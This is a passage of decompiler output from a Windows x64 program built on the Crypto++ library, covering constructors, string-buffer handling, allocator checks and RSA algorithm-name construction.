  if ( v7 )
    (**v7)(v7, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 88i64);
  return a1;
}
// 13F105F4D: variable 'v5' is possibly undefined
// 13F109700: using guessed type __int64 __fastcall sub_13F109700(_QWORD);
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F183700: using guessed type __int64 (__fastcall *off_13F183700[4])();

//----- (000000013F105FC0) ----------------------------------------------------
__int64 __fastcall sub_13F105FC0(__int64 a1, __int64 a2)
{
  __int64 v4; // rcx
  __m128i *v5; // rax
  const __m128i *v6; // r8

  *(_BYTE *)a1 = *(_BYTE *)a2;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(a1 + 16) = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(a2 + 32);
  *(_QWORD *)(a1 + 40) = *(_QWORD *)(a2 + 40);
  v4 = *(_QWORD *)(a2 + 40);
  if ( v4 )
    v5 = (__m128i *)sub_13F12E4E0(v4);
  else
    v5 = 0i64;
  *(_QWORD *)(a1 + 48) = v5;
  if ( v5 )
  {
    v6 = *(const __m128i **)(a2 + 48);
    if ( v6 )
      sub_13F17AFE0(v5, *(_QWORD *)(a1 + 40), v6, *(_QWORD *)(a2 + 40));
  }
  return a1;
}

//----- (000000013F106050) ----------------------------------------------------
__int64 __fastcall sub_13F106050(__int64 a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx
  char pExceptionObject[72]; // [rsp+30h] [rbp-48h] BYREF

  *(_QWORD *)a1 = off_13F183700;
  if ( !(unsigned int)sub_13F109700(a1) && *(_BYTE *)(a1 + 16) && !*(_BYTE *)(a1 + 17) )
  {
    sub_13F102A80((__int64)pExceptionObject, *(const __m128i **)(a1 + 8));
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  v4 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v4 )
    (**v4)(v4, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 40i64);
  return a1;
}
// 13F109700: using guessed type __int64 __fastcall sub_13F109700(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F183700: using guessed type __int64 (__fastcall *off_13F183700[4])();

//----- (000000013F1060F0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1060F0(_QWORD *a1, int a2)
{
  if ( a2 )
  {
    a1[2] = qword_13F19BE58;
    a1[15] = &CryptoPP::NameValuePairs::`vftable';
  }
  a1[1] = off_13F186288;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1862D8;
  *a1 = off_13F186408;
  a1[1] = off_13F186450;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1864A0;
  sub_13F112CF0((__int64)(a1 + 3));
  sub_13F112CF0((__int64)(a1 + 9));
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];
// 13F186408: using guessed type __int64 (__fastcall *off_13F186408[9])();
// 13F186450: using guessed type __int64 (__fastcall *off_13F186450[10])();
// 13F1864A0: using guessed type void *off_13F1864A0[12];
// 13F19BE58: using guessed type __int64 qword_13F19BE58[2];

//----- (000000013F1061A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1061A0(_QWORD *a1, int a2)
{
  if ( a2 )
  {
    a1[2] = qword_13F19BD70;
    a1[18] = qword_13F19C008;
    a1[65] = &CryptoPP::NameValuePairs::`vftable';
  }
  a1[1] = off_13F186288;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1862D8;
  *a1 = off_13F186408;
  a1[1] = off_13F186450;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1864A0;
  sub_13F112CF0((__int64)(a1 + 3));
  sub_13F112CF0((__int64)(a1 + 9));
  a1[16] = off_13F186338;
  a1[17] = off_13F186398;
  *(_QWORD *)((char *)a1 + *(int *)(a1[18] + 4i64) + 144) = off_13F1863A8;
  sub_13F131450((__int64)(a1 + 19), 0i64);
  *a1 = off_13F186500;
  a1[1] = off_13F186548;
  a1[15] = off_13F186598;
  a1[16] = off_13F1865C0;
  a1[17] = off_13F186620;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F186630;
  sub_13F112CF0((__int64)(a1 + 29));
  sub_13F112CF0((__int64)(a1 + 35));
  sub_13F112CF0((__int64)(a1 + 41));
  sub_13F112CF0((__int64)(a1 + 47));
  sub_13F112CF0((__int64)(a1 + 53));
  sub_13F112CF0((__int64)(a1 + 59));
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];
// 13F186338: using guessed type __int64 (__fastcall *off_13F186338[12])();
// 13F186398: using guessed type __int64 (__fastcall *off_13F186398[2])();
// 13F1863A8: using guessed type void *off_13F1863A8[12];
// 13F186408: using guessed type __int64 (__fastcall *off_13F186408[9])();
// 13F186450: using guessed type __int64 (__fastcall *off_13F186450[10])();
// 13F1864A0: using guessed type void *off_13F1864A0[12];
// 13F186500: using guessed type __int64 (__fastcall *off_13F186500[9])();
// 13F186548: using guessed type void *off_13F186548[10];
// 13F186598: using guessed type void *off_13F186598[5];
// 13F1865C0: using guessed type void *off_13F1865C0[12];
// 13F186620: using guessed type __int64 (__fastcall *off_13F186620[2])();
// 13F186630: using guessed type void *off_13F186630[12];
// 13F19BD70: using guessed type __int64 qword_13F19BD70[4];
// 13F19C008: using guessed type __int64 qword_13F19C008[2];

//----- (000000013F106340) ----------------------------------------------------
__int64 __fastcall sub_13F106340(__int64 a1, __int64 a2)
{
  unsigned __int64 v4; // rcx
  __m128i *v5; // rsi
  __m128i *v6; // rax
  const __m128i *v7; // r8
  __int64 v8; // rcx
  const __m128i *v9; // r8
  __m128i v11[2]; // [rsp+30h] [rbp-68h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-48h] BYREF

  *(_BYTE *)(a1 + 16) = *(_BYTE *)(a2 + 16);
  *(_DWORD *)(a1 + 24) = *(_DWORD *)(a2 + 24);
  *(_QWORD *)(a1 + 40) = *(_QWORD *)(a2 + 40);
  *(_QWORD *)(a1 + 48) = *(_QWORD *)(a2 + 48);
  v4 = *(_QWORD *)(a2 + 48);
  if ( v4 > 0x3FFFFFFFFFFFFFFFi64 )
  {
    sub_13F1053B0(v11, (const __m128i *)"AllocatorBase: requested size would cause integer overflow");
    sub_13F101600((__int64)pExceptionObject, v11);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v5 = 0i64;
  if ( v4 )
    v6 = (__m128i *)sub_13F12E450(4 * v4);
  else
    v6 = 0i64;
  *(_QWORD *)(a1 + 56) = v6;
  if ( v6 )
  {
    v7 = *(const __m128i **)(a2 + 56);
    if ( v7 )
      sub_13F17AFE0(v6, 4i64 * *(_QWORD *)(a1 + 48), v7, 4i64 * *(_QWORD *)(a2 + 48));
  }
  *(_QWORD *)(a1 + 72) = *(_QWORD *)(a2 + 72);
  *(_QWORD *)(a1 + 80) = *(_QWORD *)(a2 + 80);
  v8 = *(_QWORD *)(a2 + 80);
  if ( v8 )
    v5 = (__m128i *)sub_13F12E4E0(v8);
  *(_QWORD *)(a1 + 88) = v5;
  if ( v5 )
  {
    v9 = *(const __m128i **)(a2 + 88);
    if ( v9 )
      sub_13F17AFE0(v5, *(_QWORD *)(a1 + 80), v9, *(_QWORD *)(a2 + 80));
  }
  return a1;
}
// 13F106340: using guessed type __m128i var_68[2];

//----- (000000013F106470) ----------------------------------------------------
_QWORD *__fastcall sub_13F106470(_QWORD *a1, char a2)
{
  sub_13F105A90(a1);
  a1[15] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 128i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F1064B0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1064B0(_QWORD *a1, char a2)
{
  sub_13F105B40(a1);
  a1[65] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 528i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F106500) ----------------------------------------------------
__m128i *__fastcall sub_13F106500(__m128i *a1, _QWORD *a2)
{
  __int64 v3; // rax
  __m128i *v4; // rcx
  const __m128i *v5; // r8

  a1->m128i_i64[1] = a2[1];
  a1[5].m128i_i8[1] = 0;
  a1[5].m128i_i64[1] = a2[11];
  v3 = a2[12];
  a1[6].m128i_i64[0] = v3;
  if ( a2[12] > 0x10ui64 || a1[5].m128i_i8[1] )
  {
    v4 = 0i64;
  }
  else
  {
    a1[5].m128i_i8[1] = 1;
    v4 = a1 + 1;
  }
  a1[6].m128i_i64[1] = (__int64)v4;
  if ( v4 )
  {
    v5 = (const __m128i *)a2[13];
    if ( v5 )
      sub_13F17AFE0(v4, 4 * v3, v5, 4i64 * a2[12]);
  }
  return a1;
}

//----- (000000013F106580) ----------------------------------------------------
__int64 __fastcall sub_13F106580(__int64 a1)
{
  __m128i *v2; // rdi
  __m128i v3; // kr00_16
  __m128i *v4; // rbx
  __m128i *v5; // rbx
  __m128i *v6; // rax
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // rbx
  unsigned __int64 v9; // rcx
  const __m128i *v10; // r15
  __m128i *v11; // r14
  unsigned __int64 v12; // r12
  __m128i *v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // rdx
  __int64 v17; // rcx
  unsigned __int64 v18; // rdx
  __int64 v19; // rcx
  __m128i v21; // [rsp+30h] [rbp-98h] BYREF
  __m128i si128; // [rsp+40h] [rbp-88h]
  __m128i v23; // [rsp+50h] [rbp-78h] BYREF
  __m128i v24; // [rsp+60h] [rbp-68h]
  __int64 v25; // [rsp+70h] [rbp-58h]
  __int64 v26; // [rsp+78h] [rbp-50h]
  __int64 v27[3]; // [rsp+80h] [rbp-48h] BYREF
  unsigned __int64 v28; // [rsp+98h] [rbp-30h]

  v25 = -2i64;
  v26 = a1;
  v2 = (__m128i *)sub_13F106FE0((__int64)v27);
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v21.m128i_i8[0] = 0;
  sub_13F106C50(&v21, (const __m128i *)"RSA", 3ui64);
  v3 = si128;
  if ( si128.m128i_i64[1] == si128.m128i_i64[0] )
  {
    v6 = sub_13F107AD0(&v21, 1ui64, 0i64, (const __m128i *)"/", 1ui64);
  }
  else
  {
    ++si128.m128i_i64[0];
    v4 = &v21;
    if ( v3.m128i_i64[1] >= 0x10ui64 )
      v4 = (__m128i *)v21.m128i_i64[0];
    v5 = (__m128i *)((char *)v4 + v3.m128i_i64[0]);
    sub_13F15EB00(v5, (const __m128i *)"/", 1ui64);
    v5->m128i_i8[1] = 0;
    v6 = &v21;
  }
  v24 = 0i64;
  v23 = *v6;
  v24 = v6[1];
  v6[1].m128i_i64[0] = 0i64;
  v6[1].m128i_i64[1] = 15i64;
  v6->m128i_i8[0] = 0;
  v7 = v2[1].m128i_u64[0];
  v8 = v24.m128i_i64[0];
  if ( v7 <= v24.m128i_i64[1] - v24.m128i_i64[0] || (v9 = v2[1].m128i_u64[1], v9 - v7 < v24.m128i_i64[0]) )
  {
    if ( v2[1].m128i_i64[1] >= 0x10ui64 )
      v2 = (__m128i *)v2->m128i_i64[0];
    v13 = sub_13F106DB0(&v23, v2, v7);
    *(_QWORD *)(a1 + 16) = 0i64;
    *(_QWORD *)(a1 + 24) = 0i64;
    *(__m128i *)a1 = *v13;
    *(__m128i *)(a1 + 16) = v13[1];
    v13[1].m128i_i64[0] = 0i64;
    v13[1].m128i_i64[1] = 15i64;
    v13->m128i_i8[0] = 0;
  }
  else
  {
    v10 = &v23;
    if ( v24.m128i_i64[1] >= 0x10ui64 )
      v10 = (const __m128i *)v23.m128i_i64[0];
    if ( v24.m128i_i64[0] > v9 - v7 )
    {
      v2 = sub_13F107EB0(v2, v24.m128i_u64[0], 0i64, 0i64, v10, v24.m128i_u64[0]);
    }
    else
    {
      v2[1].m128i_i64[0] = v24.m128i_i64[0] + v7;
      v11 = v2;
      if ( v9 >= 0x10 )
        v11 = (__m128i *)v2->m128i_i64[0];
      if ( &v10->m128i_i8[v8] <= (__int8 *)v11 || v10 > (const __m128i *)&v11->m128i_i8[v7] )
      {
        v12 = v8;
      }
      else if ( v11 > v10 )
      {
        v12 = (char *)v11 - (char *)v10;
      }
      else
      {
        v12 = 0i64;
      }
      sub_13F15EB00((__m128i *)((char *)v11 + v8), v11, v7 + 1);
      sub_13F15EB00(v11, v10, v12);
      sub_13F15EB00((__m128i *)((char *)v11 + v12), (const __m128i *)((char *)v10 + v12 + v8), v8 - v12);
    }
    *(_QWORD *)(a1 + 16) = 0i64;
    *(_QWORD *)(a1 + 24) = 0i64;
    *(__m128i *)a1 = *v2;
    *(__m128i *)(a1 + 16) = v2[1];
    v2[1].m128i_i64[0] = 0i64;
    v2[1].m128i_i64[1] = 15i64;
    v2->m128i_i8[0] = 0;
  }
  if ( v24.m128i_i64[1] >= 0x10ui64 )
  {
    v14 = v24.m128i_i64[1] + 1;
    v15 = v23.m128i_i64[0];
    if ( (unsigned __int64)(v24.m128i_i64[1] + 1) >= 0x1000 )
    {
      v14 = v24.m128i_i64[1] + 40;
      v15 = *(_QWORD *)(v23.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v23.m128i_i64[0] - v15 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v15, v14);
  }
  v24 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v23.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v16 = si128.m128i_i64[1] + 1;
    v17 = v21.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v16 = si128.m128i_i64[1] + 40;
      v17 = *(_QWORD *)(v21.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v21.m128i_i64[0] - v17 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v17, v16);
  }
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v21.m128i_i8[0] = 0;
  if ( v28 >= 0x10 )
  {
    v18 = v28 + 1;
    v19 = v27[0];
    if ( v28 + 1 >= 0x1000 )
    {
      v18 = v28 + 40;
      v19 = *(_QWORD *)(v27[0] - 8);
      if ( (unsigned __int64)(v27[0] - v19 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v19, v18);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F106580: using guessed type __int64 anonymous_6[3];

//----- (000000013F1068B0) ----------------------------------------------------
__int64 __fastcall sub_13F1068B0(__int64 a1)
{
  return a1;
}

//----- (000000013F1068C0) ----------------------------------------------------
__int64 __fastcall sub_13F1068C0(_QWORD *a1)
{
  __int64 (__fastcall *v1)(__int64); // rax
  __int64 (__fastcall *v2)(__int64); // rdx
  _QWORD *v3; // rcx
  __int64 v4; // rcx
  unsigned int v5; // eax
  unsigned int v6; // eax
  __int64 v7; // rbx
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v11; // rax
  char v12[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v13; // [rsp+38h] [rbp-30h]
  unsigned __int64 v14; // [rsp+40h] [rbp-28h]
  void *v15; // [rsp+48h] [rbp-20h]

  v1 = *(__int64 (__fastcall **)(__int64))(a1[2] + 8i64);
  if ( v1 == sub_13F104140 )
  {
    v2 = *(__int64 (__fastcall **)(__int64))(*a1 + 64i64);
    if ( v2 == sub_13F104200 )
    {
      v3 = a1 + 3;
      goto LABEL_5;
    }
    v11 = v2((__int64)a1);
  }
  else
  {
    v11 = v1((__int64)(a1 + 2));
  }
  v3 = (_QWORD *)v11;
LABEL_5:
  v4 = (*(__int64 (__fastcall **)(_QWORD *, char *))(*v3 + 8i64))(v3, v12);
  v5 = sub_13F11BFE0(v4);
  if ( v5 <= 1 )
    v6 = 0;
  else
    v6 = v5 - 1;
  v7 = v6;
  v8 = v14;
  if ( v13 < v14 )
    v8 = v13;
  v9 = (__int64)v15;
  if ( v15 )
  {
    memset(v15, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  return v7;
}
// 13F1068C0: using guessed type char var_40[16];

//----- (000000013F106970) ----------------------------------------------------
__int64 __fastcall sub_13F106970(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+20h] [rbp-38h] BYREF
  __m128i si128; // [rsp+30h] [rbp-28h]
  __int64 v7; // [rsp+40h] [rbp-18h]
  __int64 v8; // [rsp+48h] [rbp-10h]

  v7 = -2i64;
  v8 = a1;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C50(&v5, (const __m128i *)"BufferedTransformation: this object doesn't allow input", 0x37ui64);
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 0;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  *(_QWORD *)a1 = off_13F181CD8;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = off_13F188BC0;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();
// 13F188BC0: using guessed type __int64 (__fastcall *off_13F188BC0[2])();
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F106A40) ----------------------------------------------------
__int64 __fastcall sub_13F106A40(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+20h] [rbp-38h] BYREF
  __m128i si128; // [rsp+30h] [rbp-28h]
  __int64 v7; // [rsp+40h] [rbp-18h]
  __int64 v8; // [rsp+48h] [rbp-10h]

  v7 = -2i64;
  v8 = a1;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C50(&v5, (const __m128i *)"BufferedTransformation: this object doesn't allow input", 0x37ui64);
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 0;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  *(_QWORD *)a1 = off_13F181CD8;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();
// 13F181D20: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F106B10) ----------------------------------------------------
_QWORD *__fastcall sub_13F106B10(_QWORD *a1, _QWORD *a2)
{
  __int64 v4; // rcx
  __m128i *v5; // rax
  const __m128i *v6; // r8

  a1[1] = a2[1];
  a1[2] = a2[2];
  v4 = a2[2];
  if ( v4 )
    v5 = (__m128i *)sub_13F12E4E0(v4);
  else
    v5 = 0i64;
  a1[3] = v5;
  if ( v5 )
  {
    v6 = (const __m128i *)a2[3];
    if ( v6 )
      sub_13F17AFE0(v5, a1[2], v6, a2[2]);
  }
  return a1;
}

//----- (000000013F106B80) ----------------------------------------------------
void __fastcall sub_13F106B80(__m128i *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  unsigned __int64 v4; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rdx

  v2 = a1[1].m128i_u64[0];
  if ( v2 <= a2 )
  {
    v4 = a1[1].m128i_u64[1];
    if ( v4 != a2 )
    {
      if ( v4 >= a2 )
      {
        if ( a2 < 0x10 && v4 >= 0x10 )
        {
          v5 = a1->m128i_i64[0];
          sub_13F15EB00(a1, (const __m128i *)a1->m128i_i64[0], v2 + 1);
          v6 = a1[1].m128i_i64[1] + 1;
          if ( v6 >= 0x1000 )
          {
            v6 = a1[1].m128i_i64[1] + 40;
            if ( (unsigned __int64)(v5 - *(_QWORD *)(v5 - 8) - 8) > 0x1F )
              sub_13F1682C0();
            v5 = *(_QWORD *)(v5 - 8);
          }
          sub_13F14088C(v5, v6);
          a1[1].m128i_i64[1] = 15i64;
        }
      }
      else
      {
        sub_13F107980(a1, a2 - v2);
        a1[1].m128i_i64[0] = v2;
      }
    }
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F106C30) ----------------------------------------------------
__m128i *__fastcall sub_13F106C30(__m128i *a1, const __m128i *a2)
{
  unsigned __int64 v2; // r8

  v2 = -1i64;
  do
    ++v2;
  while ( a2->m128i_i8[v2] );
  return sub_13F106C50(a1, a2, v2);
}

//----- (000000013F106C50) ----------------------------------------------------
__m128i *__fastcall sub_13F106C50(__m128i *a1, const __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r14
  __m128i *v7; // rdi
  __m128i *result; // rax
  __int64 v9; // rdi
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // rax
  __int64 v12; // rcx
  __int64 v13; // rax
  __m128i *v14; // rbp
  __int64 v15; // rcx
  unsigned __int64 v16; // rdx

  v3 = a1[1].m128i_u64[1];
  if ( a3 > v3 )
  {
    v9 = 0x7FFFFFFFFFFFFFFFi64;
    if ( a3 > 0x7FFFFFFFFFFFFFFFi64 )
      sub_13F107C60();
    if ( (a3 | 0xF) <= 0x7FFFFFFFFFFFFFFFi64 )
    {
      v10 = v3 >> 1;
      if ( v3 <= 0x7FFFFFFFFFFFFFFFi64 - (v3 >> 1) )
      {
        v9 = a3 | 0xF;
        if ( (a3 | 0xF) < v10 + v3 )
          v9 = v10 + v3;
      }
    }
    v11 = v9 + 1;
    if ( v9 == -1 )
      v11 = -1i64;
    if ( v11 < 0x1000 )
    {
      if ( v11 )
        v14 = (__m128i *)sub_13F14059C(v11);
      else
        v14 = 0i64;
    }
    else
    {
      v12 = v11 + 39;
      if ( v11 + 39 <= v11 )
        v12 = -1i64;
      v13 = sub_13F14059C(v12);
      if ( !v13 )
        goto LABEL_27;
      v14 = (__m128i *)((v13 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
      v14[-1].m128i_i64[1] = v13;
    }
    a1[1].m128i_i64[0] = a3;
    a1[1].m128i_i64[1] = v9;
    sub_13F15EB00(v14, a2, a3);
    v14->m128i_i8[a3] = 0;
    if ( v3 < 0x10 )
    {
LABEL_25:
      a1->m128i_i64[0] = (__int64)v14;
      return a1;
    }
    v15 = a1->m128i_i64[0];
    v16 = v3 + 1;
    if ( v3 + 1 < 0x1000 )
    {
LABEL_24:
      sub_13F14088C(v15, v16);
      goto LABEL_25;
    }
    v16 = v3 + 40;
    if ( (unsigned __int64)(v15 - *(_QWORD *)(v15 - 8) - 8) <= 0x1F )
    {
      v15 = *(_QWORD *)(v15 - 8);
      goto LABEL_24;
    }
LABEL_27:
    sub_13F1682C0();
  }
  v7 = a1;
  if ( v3 >= 0x10 )
    v7 = (__m128i *)a1->m128i_i64[0];
  a1[1].m128i_i64[0] = a3;
  sub_13F15EB00(v7, a2, a3);
  result = a1;
  v7->m128i_i8[a3] = 0;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F106DB0) ----------------------------------------------------
__m128i *__fastcall sub_13F106DB0(__m128i *a1, const __m128i *a2, unsigned __int64 a3)
{
  __int64 v5; // rcx
  unsigned __int64 v6; // r8
  __m128i *v7; // rax
  __int8 *v8; // rbx

  v5 = a1[1].m128i_i64[0];
  v6 = a1[1].m128i_u64[1];
  if ( a3 > v6 - v5 )
    return sub_13F107AD0(a1, a3, 0i64, a2, a3);
  a1[1].m128i_i64[0] = v5 + a3;
  v7 = a1;
  if ( v6 >= 0x10 )
    v7 = (__m128i *)a1->m128i_i64[0];
  v8 = &v7->m128i_i8[v5];
  sub_13F15EB00((__m128i *)((char *)v7 + v5), a2, a3);
  v8[a3] = 0;
  return a1;
}

//----- (000000013F106E40) ----------------------------------------------------
void __fastcall sub_13F106E40(__m128i **a1, const __m128i *a2)
{
  const __m128i *v2; // rbx
  unsigned __int64 v3; // rsi
  __int64 v5; // rbp
  __m128i *v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v9; // rcx

  v2 = a2;
  v3 = a2[1].m128i_u64[0];
  if ( a2[1].m128i_i64[1] >= 0x10ui64 )
    v2 = (const __m128i *)a2->m128i_i64[0];
  if ( v3 >= 0x10 )
  {
    v5 = v3 | 0xF;
    if ( (v3 | 0xF) > 0x7FFFFFFFFFFFFFFFi64 )
      v5 = 0x7FFFFFFFFFFFFFFFi64;
    v6 = (__m128i *)(v5 + 1);
    if ( (unsigned __int64)(v5 + 1) < 0x1000 )
    {
      if ( v5 != -1 )
        v6 = (__m128i *)sub_13F14059C(v5 + 1);
    }
    else
    {
      v7 = v5 + 40;
      if ( v5 + 40 <= (unsigned __int64)(v5 + 1) )
        v7 = -1i64;
      v8 = sub_13F14059C(v7);
      v9 = v8;
      if ( !v8 )
        sub_13F1682C0();
      v6 = (__m128i *)((v8 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
      v6[-1].m128i_i64[1] = v9;
    }
    *a1 = v6;
    sub_13F15EB00(v6, v2, v3 + 1);
    a1[3] = (__m128i *)v5;
    a1[2] = (__m128i *)v3;
  }
  else
  {
    *(__m128i *)a1 = *v2;
    a1[2] = (__m128i *)v3;
    a1[3] = (__m128i *)15;
  }
}

//----- (000000013F106F10) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F106F10(__int64 a1, unsigned __int64 a2)
{
  __m128i v3[2]; // [rsp+28h] [rbp-70h] BYREF
  char pExceptionObject[72]; // [rsp+50h] [rbp-48h] BYREF

  if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
  {
    sub_13F1053B0(v3, (const __m128i *)"AllocatorBase: requested size would cause integer overflow");
    sub_13F101600((__int64)pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a2 )
    return sub_13F12E450(4 * a2);
  else
    return 0i64;
}
// 13F106F10: using guessed type __m128i var_70[2];

//----- (000000013F106F90) ----------------------------------------------------
__int64 __fastcall sub_13F106F90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rdx

  v4 = 4 * a3;
  if ( (unsigned __int64)(4 * a3) >= 0x1000 )
  {
    v4 += 39i64;
    if ( (unsigned __int64)(a2 - *(_QWORD *)(a2 - 8) - 8) > 0x1F )
      sub_13F1682C0();
    a2 = *(_QWORD *)(a2 - 8);
  }
  return sub_13F14088C(a2, v4);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F106FE0) ----------------------------------------------------
__int64 __fastcall sub_13F106FE0(__int64 a1)
{
  __m128i v2; // kr00_16
  __m128i *v3; // rbx
  __m128i *v4; // rbx
  __m128i *v5; // rax
  __m128i v6; // kr10_16
  __m128i *v7; // rbx
  __m128i *v8; // rbx
  __m128i *v9; // rax
  __m128i v10; // kr20_16
  __m128i *v11; // rbx
  __m128i *v12; // rbx
  __m128i *v13; // rax
  __m128i v14; // kr30_16
  __m128i *v15; // rbx
  __m128i *v16; // rbx
  __m128i *v17; // rax
  __int64 v18; // rdx
  __int64 v19; // rcx
